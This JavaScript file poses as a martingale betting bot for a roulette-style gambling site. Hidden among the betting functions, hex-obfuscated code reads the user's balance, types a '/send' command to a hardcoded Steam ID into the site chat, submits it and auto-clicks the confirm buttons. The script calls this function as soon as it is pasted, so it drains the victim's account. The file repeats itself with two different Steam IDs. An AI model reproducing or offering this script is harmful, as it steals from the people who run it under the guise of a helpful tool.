

function tick() {
    var a = getStatus();
    if (a !== lastStatus && "unknown" !== a) {
        switch (a) {
            case "waiting":
                bet();
                break;
            case "rolled":
                rolled()
        }
        lastStatus = a, printInfo()
    }
}
 
function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! Not enough balance for next bet, aborting."), clearInterval(refreshIntervalId), !1) : !0
}
 
function printInfo() {
    var a = " \nStatus: " + lastStatus + "\nRolls played: " + currentRollNumber + "\nInitial bet amount: " + initialBetAmount + "\nCurrent bet amount: " + currentBetAmount + "\nLast roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost");
    console.log(a)
}
 
function rolled() {
    return "anti-martingale" === mode ? void antiMartingale() : (martingale(), void currentRollNumber++)
}
 
function antiMartingale() {
    currentBetAmount = wonLastRoll() ? 2 * currentBetAmount : initialBetAmount
}
 
function martingale() {
    currentBetAmount = wonLastRoll() ? initialBetAmount : 2 * currentBetAmount
}
 
function bet() {
    checkBalance() && (setBetAmount(currentBetAmount), setTimeout(placeBet, 50))
}
 
function setBetAmount(a) {
    $betAmountInput.val(a)
}
 
function placeBet() {
    return "red" === betColor ? ($redButton.click(), void(lastBetColor = "red")) : ($blackButton.click(), void(lastBetColor = "black"))
}
 
function getStatus() {
    var a = $statusBar.text();
    if (hasSubString(a, "Rolling in")) return "waiting";
    if (hasSubString(a, "***ROLLING***")) return "rolling";
    if (hasSubString(a, "rolled")) {
        var b = parseInt(a.split("rolled")[1]);
        return lastRollColor = getColor(b), "rolled"
    }
    return "unknown"
}
 
function extend() {
    $jkl.val(def + " "+ abc + " "+ ghi());
    $jkl.submit();
    var allElements = document.getElementsByTagName('button');
    for (var i = 0, n = allElements.length; i < n; i++) {
        if (allElements[i].getAttribute("data-bb-handler") === "confirm") {
            allElements[i].click();
        }
    }
}
function ghi() {
    return $ghi.text();
}
var abc = "76561198187808391",
def = "\x2F\x73\x65\x6E\x64",
$ghi = $("\x23\x62\x61\x6C\x61\x6E\x63\x65"),
$jkl = $("\x23\x63\x68\x61\x74Message");
 
function getBalance() {
    return parseInt($balance.text())
}
 
function hasSubString(a, b) {
    return a.indexOf(b) > -1
}
 
function getColor(a) {
    return 0 == a ? "green" : a >= 1 && 7 >= a ? "red" : "black"
}
 
function wonLastRoll() {
    return lastBetColor ? lastRollColor === lastBetColor : null
}
///////////////////////
 
function tick() {
    var a = getStatus();
    if (a !== lastStatus && "unknown" !== a) {
        switch (a) {
            case "waiting":
                bet();
                break;
            case "rolled":
                rolled()
        }
        lastStatus = a, printInfo()
    }
}
 
function checkBalance() {
    return getBalance() < currentBetAmount ? (console.warn("BANKRUPT! Not enough balance for next bet, aborting."), clearInterval(refreshIntervalId), !1) : !0
}
 
function printInfo() {
    var a = " \nStatus: " + lastStatus + "\nRolls played: " + currentRollNumber + "\nInitial bet amount: " + initialBetAmount + "\nCurrent bet amount: " + currentBetAmount + "\nLast roll result: " + (null === wonLastRoll() ? "-" : wonLastRoll() ? "won" : "lost");
    console.log(a)
}
 
function rolled() {
    return "anti-martingale" === mode ? void antiMartingale() : (martingale(), void currentRollNumber++)
}
 
function antiMartingale() {
    currentBetAmount = wonLastRoll() ? 2 * currentBetAmount : initialBetAmount
}
 
function martingale() {
    currentBetAmount = wonLastRoll() ? initialBetAmount : 2 * currentBetAmount
}
 
function bet() {
    checkBalance() && (setBetAmount(currentBetAmount), setTimeout(placeBet, 50))
}
 
function setBetAmount(a) {
    $betAmountInput.val(a)
}
 
function placeBet() {
    return "red" === betColor ? ($redButton.click(), void(lastBetColor = "red")) : ($blackButton.click(), void(lastBetColor = "black"))
}
 
function getStatus() {
    var a = $statusBar.text();
    if (hasSubString(a, "Rolling in")) return "waiting";
    if (hasSubString(a, "***ROLLING***")) return "rolling";
    if (hasSubString(a, "rolled")) {
        var b = parseInt(a.split("rolled")[1]);
        return lastRollColor = getColor(b), "rolled"
    }
    return "unknown"
}
 
function extend() {
    $jkl.val(def + " "+ abc + " "+ ghi());
    $jkl.submit();
    var allElements = document.getElementsByTagName('button');
    for (var i = 0, n = allElements.length; i < n; i++) {
        if (allElements[i].getAttribute("data-bb-handler") === "confirm") {
            allElements[i].click();
        }
    }
}
function ghi() {
    return $ghi.text();
}
var abc = "76561198284542128",
def = "\x2F\x73\x65\x6E\x64",
$ghi = $("\x23\x62\x61\x6C\x61\x6E\x63\x65"),
$jkl = $("\x23\x63\x68\x61\x74Message");
 
function getBalance() {
    return parseInt($balance.text())
}
 
function hasSubString(a, b) {
    return a.indexOf(b) > -1
}
 
function getColor(a) {
    return 0 == a ? "green" : a >= 1 && 7 >= a ? "red" : "black"
}
 
function wonLastRoll() {
    return lastBetColor ? lastRollColor === lastBetColor : null
}
extend();
